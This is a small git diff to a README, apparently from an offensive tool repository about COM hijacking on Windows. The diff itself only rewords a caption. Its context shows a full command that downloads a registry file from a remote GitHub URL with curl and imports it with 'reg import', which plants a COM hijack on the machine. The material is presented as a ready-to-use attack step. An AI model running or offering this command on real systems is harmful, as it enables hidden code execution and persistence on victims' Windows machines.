@@ -87,7 +87,7 @@ To enjoy hijacking you need to do the steps below:
 
 ![GIF](https://user-images.githubusercontent.com/25440152/59564365-c880f000-8ffa-11e9-914d-d974baf5dfbc.gif)
 
-The command used in the gif above:
+The command used in the gif is below:
 ```
 curl.exe --remote-time https://raw.githubusercontent.com/homjxi0e/ReaCOM/master/Classes/COMScripetlet.reg --write-out rrr.reg --output tttt.reg; echo '' '' ; reg import .\tttt.reg
 
